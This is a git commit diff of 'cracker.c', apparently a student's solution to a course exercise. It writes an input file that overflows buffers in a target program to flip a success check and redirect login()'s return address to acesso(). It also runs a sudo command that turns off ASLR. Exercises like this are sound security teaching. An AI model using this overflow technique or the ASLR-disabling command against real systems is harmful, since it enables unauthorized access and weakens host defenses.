ace8387262c682938373621094d4b2b4a3b9b059
Thiago Senff <thiagocpsenff2@gmail.com>
2023-09-18 12:05:16 -0300

    [ADD] Avaliação opcional 1: finalizada

--- opcional/av1/cracker.c
+++ opcional/av1/cracker.c
@@ -2,54 +2,34 @@
 #include <stdlib.h>
 #include <string.h>
 
-//#define STR_SIZE 92 //Defina o tamanho do seu buffer aqui
+#define STR_SIZE 97 //Defina o tamanho do seu buffer aqui
 
 int main(void) {
 
   FILE *f = fopen("./teste.in", "w+");
-  int str_size;
-  char str[103];
+  char str[STR_SIZE+1];
   //Você deve preparar a string de entrada (STDIN) aqui!
-  unsigned long int temp;
-
 
   // Passando o binario do endereço de acesso() para uma string*/
-  temp = 93824992235945;
+  unsigned long int temp = 93824992235945;
   char acesso_adress[sizeof(long int)+1];
   memcpy(acesso_adress,&temp,sizeof(long int));
   acesso_adress[sizeof(long int)] = '\0';
 
   //Primeiro acesso
-  strcpy(str,"SB\nMUITOSEGURO\n");
-  
   //Overflow em PASS, modifica STD_SUCCESS
-  strcat(str,"------------------------A BANDEIRA É MINHA\n");
+  strcpy(str,"SB\nMUITOSEGURO\n");
+  strcat(str,"------------------------A BANDEIRA É MINHA!\n");
 
-  //Overflow em P_USER, modifica rbi de login para acesso() 
-  strcat(str,"-----------------");
-  //strcat(str,"--------");
+  //Segundo acesso
+  //Overflow em, P_USER, modifica endereço de retorno de login() para acesso()
+  strcat(str,"---------------");
+  strcat(str,"--------"); 
+  strcat(str,"--------");
   strcat(str,acesso_adress);
 
-  /*Qualquer valor para P_PASS*/
-  strcat(str,"\n----------");
-  
-  
-  str_size = strlen(str);
-  printf("%i\n",str_size);
 
-  /*
-  strcpy(str,overflow);
-  strcat(str,acesso_adress);
-  strcat(str,"\n-----------");
-  str_size = strlen(str);
-  */
-
-
-
-
-
-
-  fwrite(str, 1, str_size, f);  
+  fwrite(str, 1, STR_SIZE, f);  
   fclose(f);
 
   system("sudo echo 0 > /proc/sys/kernel/randomize_va_space");
